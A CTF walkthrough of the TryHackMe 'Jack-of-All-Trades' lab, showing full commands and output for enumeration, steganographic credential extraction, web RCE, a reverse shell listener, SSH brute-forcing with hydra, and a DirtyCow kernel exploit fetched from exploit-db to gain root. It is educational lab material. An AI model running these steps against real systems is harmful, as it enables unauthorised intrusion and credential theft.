# Jack-of-All-Trades

URL: https://tryhackme.com/room/jackofalltrades

Level: Easy

Start time: 1 March 2022, 4:59pm GMT+1

End time: 1 March 2022, 10:14pm GMT+1

Actual play time: 3 hours 10 minutes

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

Let's start with a basic nmap scan:

```
# Nmap 7.92 scan initiated Tue Mar  1 16:58:31 2022 as: nmap -T4 -p- -oN 01_nmap 10.10.83.56
Nmap scan report for 10.10.83.56
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Tue Mar  1 16:59:41 2022 -- 1 IP address (1 host up) scanned in 70.03 seconds
```

We got 2 open ports. Let's check again with service detection (-sV) and default script (-sC):

```
# Nmap 7.92 scan initiated Tue Mar  1 16:59:59 2022 as: nmap -T4 -p22,80 -sC -sV -oN 02_nmap_sC_sV 10.10.83.56
Nmap scan report for 10.10.83.56
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  1 17:00:43 2022 -- 1 IP address (1 host up) scanned in 43.94 seconds
```

Uh? Funny box :) Creator swapped SSH and HTTP ports.

I tried visiting website on non-standard port, but:

![03_firefox](https://user-images.githubusercontent.com/42389836/156252879-d79c963d-e85b-4e5b-bdd3-87f6c721fa5a.png)

In order to bypass this, some `about:config` stuff is required:

![04_about-config](https://user-images.githubusercontent.com/42389836/156252986-c284ca81-5e79-49ad-97be-c88a2502e322.png)

There is pretty web page with a dinosaur:

![jack](https://user-images.githubusercontent.com/42389836/156253317-5b49edbb-c97a-4935-a8a3-28835ee38432.JPG)

HTML source code revelas some base64 encoded text and an interesting link (/recovery.php):

```
                  <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
```

Decoded text is:

```
joshua@kaligra:~/thm/Jack-of-All-Trades$ echo -n "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d                                                                                                                             
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

So far we got a credential: `u?WtKSraq`.

On `/recovery.php` we tried `admin:u?WtKSraq` or `jack:u?WtKSraq` but with no luck.

![07_recovery-php](https://user-images.githubusercontent.com/42389836/156254105-c897e1ac-6d28-4eca-8a43-fc6775ad6184.png)

We also run `gobuster` but for now we decide to focus on /assets:

```
root@kaligra:/home/joshua/thm/Jack-of-All-Trades# gobuster dir -u http://10.10.83.56:22/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.83.56:22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/01 17:04:10 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 314] [--> http://10.10.83.56:22/assets/]
Progress: 94890 / 220561 (43.02%)                                                 ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2022/03/01 17:13:31 Finished
===============================================================
```

![08_assets-php](https://user-images.githubusercontent.com/42389836/156253917-91d03e68-fd46-4bdc-9e62-e0ca2af1478b.png)

We transfer all files:

```
wget --no-parent -r http://10.10.83.56:22/assets/
```

We try some stego-technique:

```
root@kaligra:/home/joshua/thm/Jack-of-All-Trades/10.10.83.56:22/assets# steghide info stego.jpg -p u?WtKSraq
"stego.jpg":
  format: jpeg
  capacity: 1.9 KB
  embedded file "creds.txt":
    size: 58.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

It seems that `stego.jpg` contains some data (creds.txt).

We try to extract data but:

```
root@kaligra:/home/joshua/thm/Jack-of-All-Trades/10.10.83.56:22/assets# steghide extract -sf stego.jpg -p u?WtKSraq
wrote extracted data to "creds.txt".

Hehe. Gotcha!

You're on the right path, but wrong image!
```

We focus on other file (jackinthebox.jpg):

```
root@kaligra:/home/joshua/thm/Jack-of-All-Trades/10.10.83.56:22/assets# stegseek jackinthebox.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.88% (133.3 MB)
[!] error: Could not find a valid passphrase.


root@kaligra:/home/joshua/thm/Jack-of-All-Trades/10.10.83.56:22/assets# stegseek --crack jackinthebox.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.91% (133.3 MB)
[!] error: Could not find a valid passphrase.
```

Nothing here.

Last file is: `header.jpg`.

This time, we got other credentials:

```
root@kaligra:/home/joshua/thm/Jack-of-All-Trades/10.10.83.56:22/assets# steghide extract -sf header.jpg  -p u?WtKSraq
wrote extracted data to "cms.creds".
root@kaligra:/home/joshua/thm/Jack-of-All-Trades/10.10.83.56:22/assets# cat cms.creds
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

![15_backend](https://user-images.githubusercontent.com/42389836/156254659-7f7e02ea-ba96-4539-8140-9e90eb4ef5af.png)

There is a clear indication that we can use `cmd` variable to obtain RCE. Let's try:

![16_rce](https://user-images.githubusercontent.com/42389836/156254748-6326217e-1955-4e3a-b2eb-4e545c40e793.png)

Then, we try to get a reverse shell:


![18-rev_shell](https://user-images.githubusercontent.com/42389836/156254846-a74d5905-6a91-42e9-b63f-5bda39739c97.png)


```
root@kaligra:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.147.132] from (UNKNOWN) [10.10.83.56] 50379
impo
which python
/usr/bin/python


python -c 'import pty;pty.spawn("/bin/bash");'
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$
```

We got `passwd`:

```
www-data@jack-of-all-trades:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:104:109::/run/uuidd:/bin/false
Debian-exim:x:105:110::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
statd:x:107:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:108:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
```

We also note a file with a password list:

```
www-data@jack-of-all-trades:/home$ cat jacks_password_list
cat jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

Let's try with `THC Hydra`:

```
root@kaligra:/home/joshua/thm/Jack-of-All-Trades# hydra -l jack -P 21_passw_list ssh://10.10.83.56:80
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-01 17:53:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.83.56:80/
[80][ssh] host: 10.10.83.56   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-01 17:53:19
```

We found `jack` credential.

# User flag

Now we can access through SSH (on port 80!):

```
root@kaligra:/home/joshua/thm/Jack-of-All-Trades# ssh jack@10.10.83.56 -p 80
The authenticity of host '[10.10.83.56]:80 ([10.10.83.56]:80)' can't be established.
ED25519 key fingerprint is SHA256:bSyXlK+OxeoJlGqap08C5QAC61h1fMG68V+HNoDA9lk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.83.56]:80' (ED25519) to the list of known hosts.
jack@10.10.83.56's password:
jack@jack-of-all-trades:~$ ls
user.jpg
```

We can grab user flag directly on jpg image.

# Privesc

We got no lock with `sudo`, `crontab`:

```
jack@jack-of-all-trades:~$ sudo -l
[sudo] password for jack:
Sorry, user jack may not run sudo on jack-of-all-trades.
jack@jack-of-all-trades:~$ crontab -l
no crontab for jack
```

We decide to focus on kernel:

```
jack@jack-of-all-trades:~$ uname -ar
Linux jack-of-all-trades 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13) x86_64 GNU/Linux
```

We spawn a python webserver on our attacker machine:

```
root@kaligra:/opt/tools# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.83.56 - - [01/Mar/2022 18:09:18] "GET /linpeas.sh HTTP/1.1" 200 -
10.10.83.56 - - [01/Mar/2022 18:09:25] "GET /linuxprivchecker.py HTTP/1.1" 200 -
10.10.83.56 - - [01/Mar/2022 18:09:32] "GET /LinEnum.sh HTTP/1.1" 200 -
```

...and we transfer some tools on target.

Linux Exploit Suggester tell us that `dirtyc0w` is a potential privesc strategy:

```
jack@jack-of-all-trades:~$ ./linux-exploit-suggester.sh

Available information:

Kernel version: 3.16.0
Architecture: x86_64
Distribution: debian
Distribution version: 8
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

78 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

But, since we have no `gcc`, we need to compile on another system.

```
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
gcc -pthread dirtyc0w.c -o dirtyc0w
```

We transfer this file on target, but we got no luck:

```
jack@jack-of-all-trades:~$ chmod +x dirtyc0w
jack@jack-of-all-trades:~$ ./dirtyc0w foo m00000000000000000
mmap ffffffffffffffff

madvise -100000000

procselfmem -100000000

jack@jack-of-all-trades:~$ ./dirtyc0w foo m00000000000000000
mmap ffffffffffffffff

madvise -100000000

procselfmem -100000000

```

Then, we try other exploit:

```
wget https://www.exploit-db.com/download/40847
mv 40847 40847.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

We transfer on target and...

```
jack@jack-of-all-trades:~$ chmod +x dcow
jack@jack-of-all-trades:~$ ./dcow -s
Running ...
Password overridden to: dirtyCowFun

Received su prompt (Password: )

root@jack-of-all-trades:~# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@jack-of-all-trades:~# cp /tmp/.ssh_bak /etc/passwd
root@jack-of-all-trades:~# rm /tmp/.ssh_bak
root@jack-of-all-trades:~# id
uid=0(root) gid=0(root) groups=0(root),1001(dev)
```



